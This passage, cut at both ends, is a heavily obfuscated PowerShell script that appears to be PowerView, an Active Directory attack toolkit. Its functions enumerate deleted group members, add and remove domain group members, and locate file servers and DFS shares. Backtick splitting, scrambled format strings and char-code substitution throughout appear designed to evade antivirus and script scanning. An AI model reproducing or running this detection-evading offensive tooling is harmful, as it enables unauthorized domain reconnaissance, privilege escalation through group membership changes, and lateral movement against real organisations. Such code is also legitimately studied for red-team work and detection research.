        if (${p`sb`ou`NdParAmet`eRs}[("{2}{1}{0}"-f 'ope','rchSc','Sea')]) { ${SeA`Rc`HeRARg`UMents}[("{1}{3}{0}{2}"-f 'rchScop','S','e','ea')] = ${sE`ARc`hSC`Ope} }
        if (${p`sBOuNDPAr`AM`e`T`eRs}[("{3}{0}{1}{2}"-f 'l','tPageSiz','e','Resu')]) { ${Se`A`RCHe`RaR`GU`Ments}[("{0}{1}{4}{3}{2}" -f'Res','ultPa','Size','e','g')] = ${r`eSu`LTpA`GesI`zE} }
        if (${Psb`O`UNd`pa`R`AmetErs}[("{0}{1}{3}{2}" -f 'Server','Tim','imit','eL')]) { ${SEa`RCheRarGu`mEn`Ts}[("{0}{1}{3}{2}"-f 'Ser','verTime','t','Limi')] = ${seRve`RTIM`E`Li`Mit} }
        if (${Ps`BoUN`DpA`RA`MetERs}[("{2}{0}{1}"-f 'to','ne','Tombs')]) { ${SEa`RCHEr`Ar`GUm`eNTs}[("{1}{0}" -f'stone','Tomb')] = ${To`MB`STone} }
        if (${psBoUn`D`parA`Me`TErs}[("{0}{1}{2}" -f 'Cred','ent','ial')]) { ${SeARc`heRAR`G`Ume`Nts}[("{2}{1}{0}"-f 'ential','ed','Cr')] = ${CrE`d`entiAl} }
    }

    PROCESS {
        if (${pS`BoUnDPAR`AM`et`e`Rs}[("{0}{1}" -f'Identit','y')]) { ${S`eArcherAr`GUmE`N`TS}[("{2}{1}{0}"-f 'entity','d','I')] = ${id`ENtITy} }

        &("{1}{0}{3}{4}{2}" -f '-Do','Get','nObject','m','ai') @SearcherArguments | &("{0}{3}{4}{2}{1}" -f'F','ject','ch-Ob','o','rEa') {
            ${o`Bjectdn} = ${_}."Pr`op`e`RTIes"[("{2}{1}{3}{0}"-f'e','stinguishe','di','dnam')][0]
            ForEach(${Xml`No`de} in ${_}."proP`ert`IES"[("{3}{4}{0}{2}{1}" -f 's-r','aluemetadata','eplv','ms','d')]) {
                ${T`EmPOb`Je`Ct} = [xml]${x`m`lnode} | &("{0}{1}{4}{3}{2}" -f 'Se','lect','t','c','-Obje') -ExpandProperty ("{4}{2}{3}{1}{0}" -f 'DATA','LUE_META_','EPL_V','A','DS_R') -ErrorAction ("{4}{3}{2}{1}{0}"-f 'inue','Cont','ly','ilent','S')
                if (${tem`po`BjeCT}) {
                    if ((${TEmpo`BJ`ECt}."PSZ`AtT`Ribu`TEn`Ame" -Match ("{2}{0}{1}"-f'be','r','mem')) -and ((${t`EmPObJ`eCT}."dwvERsI`oN" % 2) -eq 0 )) {
                        ${oU`TpUT} = &("{1}{2}{0}"-f'-Object','Ne','w') ("{0}{1}{2}" -f 'PSO','bj','ect')
                        ${o`UT`PuT} | &("{0}{3}{1}{2}"-f'Add-Mem','e','r','b') ("{0}{1}{2}" -f 'N','oteProper','ty') ("{0}{1}"-f 'Grou','pDN') ${ob`J`ec`TDn}
                        ${OU`T`pUT} | &("{2}{1}{0}"-f 'r','-Membe','Add') ("{1}{2}{0}{3}" -f'teProp','N','o','erty') ("{0}{1}{2}" -f 'Me','m','berDN') ${teMp`ob`JE`ct}."Ps`Z`objecTdN"
                        ${oU`T`put} | &("{1}{0}{2}"-f'e','Add-M','mber') ("{0}{2}{1}"-f'N','rty','otePrope') ("{1}{0}{4}{3}{2}"-f'eF','Tim','ded','stAd','ir') ${TeM`pOBJe`CT}."FTi`MeC`RE`AtED"
                        ${OUtp`Ut} | &("{1}{0}{2}" -f'd-Me','Ad','mber') ("{3}{0}{1}{2}" -f'ePro','p','erty','Not') ("{0}{1}{2}" -f'T','imeDe','leted') ${teMP`O`B`JeCt}."ftiMED`EL`eteD"
                        ${o`U`Tput} | &("{0}{1}{2}"-f'Ad','d-Memb','er') ("{3}{2}{1}{0}"-f'rty','e','p','NotePro') ("{4}{0}{3}{2}{1}{5}"-f 'tOr','ingChan','t','igina','Las','ge') ${TE`M`poBJEcT}."FTIMelAs`T`orig`inaT`iN`GChange"
                        ${O`UtPUT} | &("{2}{1}{0}" -f 'mber','-Me','Add') ("{2}{0}{1}" -f 'tePrope','rty','No') ("{0}{1}{2}"-f'Ti','mes','Added') (${TeMpob`j`ect}."Dwve`Rs`IOn" / 2)
                        ${Outp`UT} | &("{1}{2}{0}{3}"-f 'M','A','dd-','ember') ("{2}{3}{0}{1}"-f 'er','ty','Not','eProp') ("{2}{0}{3}{4}{5}{1}" -f 'i','saDN','LastOr','g','inatin','gD') ${T`EmpOB`Je`ct}."Ps`Z`la`S`TorI`gina`TINGDsaDN"
                        ${O`Ut`put}."P`sOb`jEcT"."t`yPEn`AmEs".("{1}{0}"-f 'nsert','I').Invoke(0, ("{4}{5}{1}{0}{2}{3}"-f 'GroupMem','omain','b','erDeleted','PowerVi','ew.D'))
                        ${o`Ut`Put}
                    }
                }
                else {
                    &("{1}{2}{0}" -f'se','Wr','ite-Verbo') ('['+'Get-DomainG'+'roup'+'Me'+'mberDe'+'le'+'t'+'ed]'+' '+'E'+'rr'+'or '+'retri'+'e'+'vi'+'ng '+(('2'+'pdmsds-'+'rep'+'lvalu'+'em'+'etadata2'+'pd ')-cREPLACE([cHAr]50+[cHAr]112+[cHAr]100),[cHAr]39)+'for'+' '+"'$ObjectDN'")
                }
            }
        }
    }
}


function AdD-dOMai`N`G`RoUPmeMB`Er {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{4}{2}{1}{0}" -f'ess','Proc','d','PSSho','ul'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(POSitiOn = 0, mAndatOrY = ${tr`Ue})]
        [Alias({"{1}{2}{0}" -f 'e','Grou','pNam'}, {"{0}{1}{2}" -f'GroupId','entit','y'})]
        [String]
        ${IDe`Nti`TY},

        [Parameter(MAnDatOry = ${tR`UE}, vAlueFrOmpiPeline = ${tR`UE}, vALueFROMpipELIneBYpROpertYNaMe = ${t`RUe})]
        [Alias({"{1}{2}{0}{3}"-f 'dentit','Membe','rI','y'}, {"{1}{2}{0}" -f'r','Mem','be'}, {"{4}{3}{1}{2}{0}" -f'ame','uished','N','ting','Dis'})]
        [String[]]
        ${mEmB`E`RS},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`mAiN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CredeN`Ti`Al} =  (  &("{1}{0}{3}{2}" -f'et-','G','aBLE','Vari') ("5r0"+"VK") -vA)::"eMp`TY"
    )

    BEGIN {
        ${coN`TexTArG`Umen`TS} = @{
            ("{0}{1}{2}"-f 'Iden','tit','y') = ${ID`enTi`TY}
        }
        if (${pSBO`UN`DpaRametE`Rs}[("{1}{2}{0}"-f'in','D','oma')]) { ${cO`Ntexta`RGuME`N`TS}[("{0}{1}"-f 'Domai','n')] = ${D`omA`in} }
        if (${psB`oUN`DpA`RAm`EtE`RS}[("{1}{2}{0}"-f 'tial','Cred','en')]) { ${cO`NT`exTa`R`GUmENtS}[("{0}{2}{1}" -f'Creden','ial','t')] = ${C`R`e`DEnTial} }

        ${GR`OuPc`oNtExt} = &("{0}{3}{6}{4}{5}{2}{1}"-f'Get-Prin','xt','e','c','al','Cont','ip') @ContextArguments

        if (${GrO`Upc`onte`XT}) {
            try {
                ${g`R`Oup} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::("{0}{1}{3}{2}"-f 'F','indBy','y','Identit').Invoke(${G`Roup`COnT`ExT}."C`oNt`EXt", ${GROu`pcOnT`exT}."i`de`NTiTy")
            }
            catch {
                &("{2}{0}{1}"-f 'e-Warni','ng','Writ') ('['+'Add-Dom'+'ai'+'nGroupMe'+'mber'+']'+' '+'Error'+' '+'fi'+'nding '+'t'+'he '+'grou'+'p'+' '+'id'+'en'+'tity '+"'$Identity' "+': '+"$_")
            }
        }
    }

    PROCESS {
        if (${g`RoUp}) {
            ForEach (${M`eMB`ER} in ${meM`B`erS}) {
                if (${M`eMb`Er} -match ((("{0}{1}{2}" -f '.+','pZ4p','Z4.+'))."r`e`pLace"(([ChAr]112+[ChAr]90+[ChAr]52),[sTRInG][ChAr]92))) {
                    ${con`TE`XT`ArG`UME`Nts}[("{0}{1}" -f 'Identi','ty')] = ${M`EM`BeR}
                    ${Use`Rco`NteXT} = &("{0}{1}{5}{4}{3}{2}" -f'Get-','P','lContext','a','ip','rinc') @ContextArguments
                    if (${USeR`CoN`TeXT}) {
                        ${U`se`Ri`DEntiTy} = ${U`SEr`COnT`EXT}."IDEnTi`Ty"
                    }
                }
                else {
                    ${uSe`RCO`N`TExT} = ${g`R`oUpCOnTe`xt}
                    ${UseR`Id`ENti`TY} = ${M`EmBeR}
                }
                &("{2}{3}{0}{1}"-f'Verb','ose','Write','-') ('[A'+'d'+'d-'+'DomainGr'+'o'+'upMember] '+'Addi'+'ng '+'me'+'mbe'+'r '+"'$Member' "+'t'+'o '+'g'+'roup'+' '+"'$Identity'")
                ${M`Em`BEr} = [System.DirectoryServices.AccountManagement.Principal]::("{1}{4}{0}{3}{2}" -f 'n','Fin','ty','ti','dByIde').Invoke(${USe`R`cON`Text}."c`o`NtexT", ${usERiDEn`TI`TY})
                ${g`R`OuP}."mEm`Be`Rs".("{0}{1}"-f 'A','dd').Invoke(${meMb`eR})
                ${G`RO`UP}.("{0}{1}"-f'S','ave').Invoke()
            }
        }
    }
}


function re`mO`Ve-d`OMaI`NgroUP`ME`mBer {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{4}{2}{1}" -f 'P','cess','dPro','SS','houl'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(PoSiTIoN = 0, MAnDAtoRy = ${tr`UE})]
        [Alias({"{0}{2}{1}" -f 'Grou','me','pNa'}, {"{2}{0}{1}"-f 'pI','dentity','Grou'})]
        [String]
        ${i`de`NtIty},

        [Parameter(MAnDatOrY = ${T`RuE}, vAlUEfrOmpIpelINe = ${TR`UE}, VaLUefromPipeLInEbYpROpERtYNAMe = ${T`RUe})]
        [Alias({"{2}{0}{1}" -f 'dent','ity','MemberI'}, {"{1}{0}" -f 'ber','Mem'}, {"{0}{5}{4}{3}{1}{2}" -f 'Di','a','me','edN','tinguish','s'})]
        [String[]]
        ${mE`Mbe`Rs},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOm`AIn},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRe`dent`IAL} =  ( &("{0}{1}{2}" -f'vARi','ABL','E')  ("{0}{1}" -f'5','r0VK')  )."Va`LUe"::"EMP`Ty"
    )

    BEGIN {
        ${COntEXtARg`UM`e`N`Ts} = @{
            ("{1}{2}{0}" -f 'y','Id','entit') = ${Id`e`NTiTY}
        }
        if (${psbOUNDp`A`R`AmeTErS}[("{2}{1}{0}" -f 'ain','m','Do')]) { ${coN`TExTArGUM`e`NTs}[("{0}{1}"-f'D','omain')] = ${do`mA`IN} }
        if (${PSb`O`Un`dP`ARA`METERS}[("{1}{2}{0}" -f 'al','Cred','enti')]) { ${CONtE`xT`ArGU`M`eNTS}[("{1}{2}{3}{0}"-f'ial','Cr','eden','t')] = ${cr`Eden`Ti`AL} }

        ${grOup`CoNtE`xT} = &("{2}{1}{4}{0}{3}"-f'r','e','G','incipalContext','t-P') @ContextArguments

        if (${g`ROupC`O`NTExt}) {
            try {
                ${G`R`Oup} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::("{2}{1}{3}{0}{4}"-f 'yIde','in','F','dB','ntity').Invoke(${GRoU`PcONte`xT}."c`ONTEXt", ${gR`oUPCO`NT`ext}."i`denT`ITY")
            }
            catch {
                &("{2}{3}{0}{1}"-f 'W','arning','Write','-') ('[Rem'+'o'+'ve-Doma'+'in'+'Gro'+'u'+'pM'+'ember]'+' '+'Err'+'or '+'findi'+'n'+'g '+'t'+'he '+'g'+'roup '+'id'+'e'+'ntity '+"'$Identity' "+': '+"$_")
            }
        }
    }

    PROCESS {
        if (${GRO`UP}) {
            ForEach (${M`emb`Er} in ${M`EmB`ERs}) {
                if (${ME`MB`er} -match ((("{1}{2}{0}{3}" -f'Zxt','.','+t','Zx.+')) -REPlacE  ([CHAR]116+[CHAR]90+[CHAR]120),[CHAR]92)) {
                    ${ConTEXt`ArG`U`ME`Nts}[("{1}{2}{0}"-f 'ty','Id','enti')] = ${me`m`BER}
                    ${uSE`Rco`Nt`EXT} = &("{5}{1}{3}{2}{4}{0}" -f 'alContext','e','-P','t','rincip','G') @ContextArguments
                    if (${uS`e`RC`onTexT}) {
                        ${USe`R`I`DENTI`Ty} = ${uS`ErCO`N`TEXt}."ideNt`I`TY"
                    }
                }
                else {
                    ${uSeRcONT`e`xt} = ${grOuPC`oN`T`ExT}
                    ${userIdE`Nt`iTY} = ${ME`MB`er}
                }
                &("{2}{0}{1}{4}{3}" -f'te-','V','Wri','ose','erb') ('[R'+'emove-DomainGr'+'o'+'up'+'Mem'+'ber] '+'Re'+'mo'+'ving '+'me'+'mb'+'er '+"'$Member' "+'fro'+'m '+'gr'+'ou'+'p '+"'$Identity'")
                ${M`e`MBeR} = [System.DirectoryServices.AccountManagement.Principal]::("{0}{2}{4}{3}{1}" -f'Find','tity','ByI','en','d').Invoke(${use`RcoNTE`Xt}."cO`NTexT", ${u`sE`RideNTiTy})
                ${G`ROup}."mE`MBERS".("{1}{0}"-f 've','Remo').Invoke(${M`eMBER})
                ${g`RoUP}.("{0}{1}"-f'S','ave').Invoke()
            }
        }
    }
}


function GEt`-dOMAi`N`FILese`RV`ER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{1}{0}{4}" -f'Pr','hould','PS','S','ocess'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValUEFROMpiPElinE = ${T`RUe}, ValuEfrOmpiPELINEBYPRoPERtyNaME = ${TR`UE})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f 'DomainN','am','e'}, {"{1}{0}" -f'me','Na'})]
        [String[]]
        ${DOmA`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f'r','te','Fil'})]
        [String]
        ${ld`A`pfI`lTer},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f 'A','DSPat','h'})]
        [String]
        ${SEA`R`ChBaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{5}{3}{2}{0}{4}{1}"-f 'ol','r','r','nCont','le','Domai'})]
        [String]
        ${seR`VeR},

        [ValidateSet({"{1}{0}"-f'ase','B'}, {"{1}{0}" -f'l','OneLeve'}, {"{1}{0}"-f 'e','Subtre'})]
        [String]
        ${se`ARc`hsCopE} = ("{2}{1}{0}" -f 'ree','bt','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ReSul`TPAge`S`IZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`ErVeRt`iMel`IMit},

        [Switch]
        ${tOMb`s`To`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`ReDeNti`Al} =   (  &("{0}{1}{2}" -f'Ge','T','-vARIABLe')  ("{1}{0}"-f'k','5R0v'))."v`AluE"::"EMP`TY"
    )

    BEGIN {
        function sPlI`T`-`PAtH {
            
            Param([String]${pA`Th})

            if (${Pa`Th} -and (${PA`Th}.("{1}{0}"-f't','spli').Invoke('\\')."co`UNt" -ge 3)) {
                ${TE`Mp} = ${pa`TH}.("{1}{0}" -f't','spli').Invoke('\\')[2]
                if (${t`EMP} -and (${Te`Mp} -ne '')) {
                    ${T`emp}
                }
            }
        }

        ${SEAr`ch`er`ArGUm`eNTs} = @{
            ("{1}{0}{2}" -f 'F','LDAP','ilter') = (((("{15}{9}{20}{8}{14}{25}{29}{3}{4}{22}{0}{27}{18}{2}{6}{21}{5}{12}{17}{23}{7}{16}{28}{24}{19}{13}{26}{10}{1}{30}{11}"-f'!','path=','serAcc','6','8)','n','ountC','.1.4.80','t','c','profile','))','trol:','path=*','Typ','(&(samAc','3:=2)','1.2.84','u','}(homedirectory=*)(script','oun','o','(','0.113556','{0','e=805',')(','(',')(','3063','*)'))  -F [CHar]124))
            ("{2}{0}{1}"-f'er','ties','Prop') = ("{5}{6}{7}{0}{2}{3}{1}{4}"-f 'profi','a','l','ep','th','homedirectory,s','criptp','ath,')
        }
        if (${p`s`BouND`pAraMEt`ERS}[("{1}{2}{0}"-f 'hBase','Se','arc')]) { ${seARc`HErArG`UME`NTs}[("{1}{3}{0}{2}"-f 'rchBa','Se','se','a')] = ${SE`ARc`HBASe} }
        if (${pS`Boun`DPARaM`e`TerS}[("{1}{0}" -f'rver','Se')]) { ${se`ARc`h`eRAr`GUm`ENtS}[("{1}{0}"-f 'r','Serve')] = ${sE`R`VeR} }
        if (${PS`B`OUnd`P`A`RAMETERs}[("{2}{1}{0}{3}"-f'archSco','e','S','pe')]) { ${s`eA`RCHe`Rarg`UmE`NtS}[("{1}{2}{0}{3}" -f'hScop','Sear','c','e')] = ${SEar`cHSC`OPE} }
        if (${PsbouNdp`AR`AM`etErS}[("{3}{2}{0}{1}" -f'ltPageSi','ze','esu','R')]) { ${se`A`RCherar`guMeNTs}[("{2}{4}{0}{3}{1}"-f'sult','ageSize','R','P','e')] = ${re`sUlTpA`G`e`size} }
        if (${PsB`O`Un`Dp`ArAMetE`Rs}[("{3}{2}{4}{1}{0}" -f 'it','eLim','verT','Ser','im')]) { ${Sea`RCheRar`gUM`en`TS}[("{3}{2}{0}{1}" -f'eLimi','t','m','ServerTi')] = ${SeR`VERTi`m`E`l`imIT} }
        if (${p`sbOun`D`PARA`METERS}[("{1}{2}{0}"-f 'one','Tombs','t')]) { ${S`E`ArcHERaRgum`eN`Ts}[("{1}{2}{0}"-f 'tone','T','ombs')] = ${TOm`BS`T`ONe} }
        if (${pS`BoUn`dP`ARAmeteRS}[("{1}{3}{2}{0}"-f 'al','Cr','enti','ed')]) { ${se`ArcHe`RaRgUmEn`TS}[("{2}{1}{0}" -f'al','redenti','C')] = ${CrEDenT`i`AL} }
    }

    PROCESS {
        if (${Ps`BO`UN`DPARA`metErs}[("{0}{1}" -f'Domai','n')]) {
            ForEach (${tA`RgE`Td`omAiN} in ${dO`m`AIN}) {
                ${SEa`R`c`H`eRarguME`NtS}[("{0}{1}{2}" -f'Do','m','ain')] = ${tA`RGeTd`Oma`in}
                ${uS`eRsEa`R`cHeR} = &("{2}{3}{4}{1}{0}" -f'cher','ar','Get-D','om','ainSe') @SearcherArguments
                
                $(ForEach(${USE`R`ResUlT} in ${U`sErsEa`Rc`h`ER}.("{1}{0}" -f'll','FindA').Invoke()) {if (${USe`RrEsu`Lt}."P`ROPE`RTIES"[("{0}{2}{1}" -f'homedire','ory','ct')]) {&("{0}{1}{2}"-f 'S','plit-P','ath')(${UseR`RE`S`ULt}."PROpERT`i`ES"[("{2}{0}{1}{3}"-f 'ed','irector','hom','y')])}if (${US`eRRESu`lt}."P`RoPer`Ti`es"[("{0}{2}{1}{3}"-f 'sc','tpat','rip','h')]) {&("{0}{1}{2}"-f 'S','plit','-Path')(${U`SErr`esUlT}."Prop`e`Rti`Es"[("{1}{0}{2}" -f'ri','sc','ptpath')])}if (${Us`ERr`esULt}."PRO`PERT`IES"[("{2}{0}{1}"-f 'rofilepat','h','p')]) {&("{1}{2}{0}" -f 'Path','Split','-')(${U`SErreSu`lt}."pRO`pERtI`es"[("{3}{1}{0}{2}"-f'pat','e','h','profil')])}}) | &("{0}{2}{1}" -f 'S','rt-Object','o') -Unique
            }
        }
        else {
            ${u`se`RseARCHEr} = &("{1}{2}{3}{0}" -f'her','Get-','Domai','nSearc') @SearcherArguments
            $(ForEach(${UseRrE`s`ULT} in ${UsER`SE`ArchEr}.("{2}{0}{1}" -f'ndAl','l','Fi').Invoke()) {if (${USer`R`ESU`lt}."P`ROpeRti`es"[("{0}{2}{3}{1}"-f'homed','tory','i','rec')]) {&("{1}{3}{0}{2}"-f'at','Spli','h','t-P')(${Use`Rr`E`suLT}."prOp`erT`I`Es"[("{0}{1}{2}" -f 'homed','ir','ectory')])}if (${Us`E`RRes`UlT}."P`ROpErT`Ies"[("{1}{0}{2}{3}"-f 'p','scri','tp','ath')]) {&("{1}{0}{2}{3}"-f't','Spli','-Pat','h')(${U`s`E`RrEsULt}."pROPe`RTI`es"[("{2}{0}{1}" -f 'pt','path','scri')])}if (${Us`Err`EsUlt}."PROpe`R`TiES"[("{1}{0}{2}"-f 'epa','profil','th')]) {&("{2}{1}{0}{3}" -f 'at','plit-P','S','h')(${usER`RE`s`Ult}."pROp`ERT`iES"[("{3}{1}{2}{0}" -f'h','ofi','lepat','pr')])}}) | &("{0}{2}{1}"-f 'Sor','ect','t-Obj') -Unique
        }
    }
}


function get-dOMai`NDfSs`H`A`RE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{2}{1}" -f 'PS','ouldProcess','h','S'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{9}{4}{2}{7}{0}{5}{1}{6}{3}{8}"-f 'r','o','re','signm','seDecla','sM','reThanAs','dVa','ents','PSU'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{2}{3}{1}{0}{4}" -f'ovedVerb','r','seA','pp','s','PSU'}, '')]
    [OutputType({"{8}{2}{0}{6}{3}{5}{1}{4}{7}"-f 'e','mation.','anagem','t.','PSCusto','Auto','n','mObject','System.M'})]
    [CmdletBinding()]
    Param(
        [Parameter( vaLuefROmPipeline = ${t`RUE}, VALUeFRompIpeLInebYPRopertyNAMe = ${TR`UE})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f 'me','DomainN','a'}, {"{1}{0}"-f'e','Nam'})]
        [String[]]
        ${dO`MA`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'h','Pat','ADS'})]
        [String]
        ${s`earCHB`ASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{4}{1}{5}{0}{3}" -f 'inC','m','D','ontroller','o','a'})]
        [String]
        ${S`ERV`Er},

        [ValidateSet({"{1}{0}"-f 'ase','B'}, {"{2}{0}{1}" -f 'neL','evel','O'}, {"{2}{0}{1}"-f 're','e','Subt'})]
        [String]
        ${searCH`s`copE} = ("{2}{1}{0}" -f 'tree','ub','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${resu`Lt`p`AGEsi`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sE`R`V`eRTIM`ElimIt},

        [Switch]
        ${To`m`B`sTOnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REDe`Nti`AL} =  (&("{0}{1}" -f'G','cI')  ("{1}{3}{0}{4}{2}"-f 'E','vaR','5R0Vk','IAbL',':') )."VaL`Ue"::"emP`Ty",

        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        ${VE`RSIon} = 'All'
    )

    BEGIN {
        ${SeA`Rc`h`e`RAr`guMeNTS} = @{}
        if (${psboUNd`PA`RA`M`et`Ers}[("{1}{2}{0}"-f 'e','SearchBa','s')]) { ${s`E`ARC`h`ERaR`GumENTS}[("{0}{3}{1}{2}"-f 'Se','rchBas','e','a')] = ${SeAr`chb`ASE} }
        if (${psB`O`UndPAr`A`MeteRS}[("{1}{0}" -f'erver','S')]) { ${sea`RCHerA`RgUM`E`NTs}[("{0}{1}"-f 'Serve','r')] = ${s`e`RvER} }
        if (${pS`BOUN`dPaRa`MeTE`RS}[("{0}{1}{2}"-f'Sea','rchSc','ope')]) { ${Sea`Rc`heR`ArgUMen`TS}[("{2}{0}{1}" -f'co','pe','SearchS')] = ${sea`R`CHscoPe} }
        if (${PSboUND`p`AR`Am`EtErS}[("{1}{3}{2}{0}" -f'ize','ResultPa','eS','g')]) { ${sEARc`H`ERArg`UME`NTS}[("{0}{3}{4}{2}{1}" -f'Re','e','eSiz','sult','Pag')] = ${r`EsuL`TpAgESiZE} }
        if (${pSbO`UNDp`A`R`AmETErS}[("{1}{2}{0}"-f'meLimit','S','erverTi')]) { ${seaR`C`hEraRgUMe`N`Ts}[("{3}{1}{0}{2}" -f 'TimeLim','r','it','Serve')] = ${SE`RvE`RTimeLIM`iT} }
        if (${pSB`ouN`DParAme`T`eRS}[("{2}{0}{1}"-f 'mbsto','ne','To')]) { ${sEAr`cH`EraRGUm`e`NTS}[("{1}{0}{2}"-f 'n','Tombsto','e')] = ${Tom`B`sToNe} }
        if (${P`sBOUnd`PaR`AMETe`Rs}[("{3}{0}{1}{2}" -f 'ede','n','tial','Cr')]) { ${sEAR`C`hERA`RgUmeNTs}[("{0}{2}{1}"-f'Cred','tial','en')] = ${C`Rede`NtIaL} }

        function pa`RS`e-Pkt {
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${p`Kt}
            )

            ${B`In} = ${p`kt}
            ${b`lOB_VER`SI`ON} =   ( &("{0}{2}{1}{3}"-f 'G','a','et-varI','bLE')  357 )."vAL`UE"::"TOU`INt32"(${b`in}[0..3],0)
            ${B`lo`B_eLEment_co`UnT} =   ( &("{0}{1}{2}" -f'chIL','dit','Em') ("VA"+"r"+"iabLE:"+"357") )."V`ALUE"::"To`Ui`NT32"(${B`in}[4..7],0)
            ${ofFS`eT} = 8
            
            ${OBJ`E`ct_li`st} = @()
            for(${I}=1; ${i} -le ${b`lob_El`em`ent_counT}; ${i}++){
                ${blOb_n`A`Me_sIzE_`stA`Rt} = ${o`FF`SEt}
                ${BL`oB`_n`AmE_`sI`ze_eNd} = ${oFFS`et} + 1
                ${Bl`o`B_nA`ME_`sIzE} =   (&("{0}{1}{2}" -f'GEt-','variAbl','e') 357 -vAl)::"tOU`iNT`16"(${b`iN}[${BLob_NAmE_`SI`ze_`StARt}..${blO`B_NA`me`_sIZE`_EnD}],0)

                ${B`L`ob_NAM`E_StArt} = ${BlOB`_nA`ME_s`iZE`_`e`ND} + 1
                ${bLOb_`Nam`e`_EnD} = ${bl`OB_N`Ame_S`Ta`Rt} + ${BlOB_Na`Me_`SI`ZE} - 1
                ${Blo`B_nA`Me} =   (  &('LS') ("{1}{2}{0}" -f'OZDI','VAri','ablE:')  )."val`UE"::"U`NIcOdE"."get`stri`Ng"(${b`in}[${B`loB`_nAme_StArt}..${bLoB_`Nam`e_eND}])

                ${bL`ob`_DaTa_SI`ze`_S`TA`Rt} = ${blOB`_`N`AmE_enD} + 1
                ${BloB_`d`A`Ta_sIz`E_EnD} = ${bLo`B_`d`ATA_`si`ze_st`ART} + 3
                ${BloB`_DaTA_s`izE} =   ( &("{2}{0}{1}" -f'Ite','M','cHiLd')  ("{2}{3}{1}{0}"-f'57','blE:3','VAri','A'))."val`UE"::"tOu`i`Nt32"(${b`In}[${bLO`B`_`D`ATa_size_s`TArT}..${blO`B_`da`Ta_Size_`e`ND}],0)

                ${BLOb_d`Ata_s`TA`Rt} = ${bl`ob_d`A`Ta_`sizE_END} + 1
                ${BlOB`_`DAta_`E`ND} = ${blOb_`dAta_`ST`ART} + ${blob`_`dat`A_SiZe} - 1
                ${b`LOB_DA`Ta} = ${b`In}[${Bl`Ob_datA`_st`ARt}..${B`L`Ob_D`Ata_eND}]
                switch -wildcard (${bL`O`B_name}) {
                    ((("{3}{1}{0}{2}" -f 'it','s','eroot','{0}'))  -F[cHar]92) {  }
                    ((("{1}{2}{3}{4}{5}{0}" -f '*','{0','}doma','i','nro','ot')) -f  [chAR]92) {
                        
                        
                        ${rooT_or_L`i`NK_G`Uid`_st`ART} = 0
                        ${ro`OT_O`R_l`i`NK_gUiD_e`ND} = 15
                        ${Ro`OT_oR_`L`INK_gu`iD} = [byte[]]${B`LoB_d`ATA}[${RooT_Or`_Li`N`k_`guI`D`_`START}..${root`_Or_`lINk`_GuId`_END}]
                        ${gU`id} = &("{3}{1}{2}{0}"-f 'ct','w-','Obje','Ne') ("{1}{0}"-f 'd','Gui')(,${R`oot_OR`_l`iNK_gUID}) 
                        ${PR`eFIx_Si`ze_S`TA`Rt} = ${RoO`T`_or_L`iNK_GuId_`End} + 1
                        ${p`R`eF`iX_SiZ`e_E`Nd} = ${pRefI`x_SI`Ze`_StART} + 1
                        ${p`R`EFi`x_size} =  ( &("{1}{0}{2}"-f'HILdit','c','EM') ('V'+'arIA'+'Ble:357'))."VA`lUE"::"TO`UIN`T16"(${b`LoB`_`dATa}[${P`REfI`x_siz`e_`s`TaRt}..${PRe`F`Ix`_S`IzE_end}],0)
                        ${p`REfiX_`StART} = ${pr`efI`X`_s`izE_E`ND} + 1
                        ${P`R`EfIX_`EnD} = ${PrEF`ix`_s`TArt} + ${p`R`EfiX`_SiZE} - 1
                        ${p`ReF`IX} =   ( &("{0}{3}{1}{2}" -f'geT-VA','b','LE','RiA')  ('o'+'zdi')  -vAlUeoNl)::"Un`I`CodE"."GE`T`STRING"(${bLOb_`D`Ata}[${preF`Ix_`StarT}..${PReFi`x_e`ND}])

                        ${sH`orT_P`Re`FIX_`siZE_`StaRT} = ${pRE`FIX_e`Nd} + 1
                        ${shor`T_prEfI`x_S`I`zE_`enD} = ${SHO`Rt_pRefIX`_SizE`_`S`TART} + 1
                        ${sh`o`Rt_pR`e`FIx`_sIze} =   (  &("{2}{3}{1}{0}"-f 'DitEM','iL','G','eT-cH') ("{1}{0}{3}{2}" -f 'r','vA','e:357','iAbL') )."V`AlUE"::"tOuint`16"(${B`LOB`_DATa}[${S`HOr`T_Pr`ef`ix_sI`zE`_sT`ARt}..${S`hOrT`_`Pr`e`FIx_SizE_E`Nd}],0)
                        ${shoRT`_PReFI`X`_STA`RT} = ${sHOrT_`pr`e`F`Ix_sIzE_e`ND} + 1
                        ${ShOrT_PRe`FI`x`_EnD} = ${shORT`_`pR`EfIx_stARt} + ${s`HO`RT_`pReFix_sIze} - 1
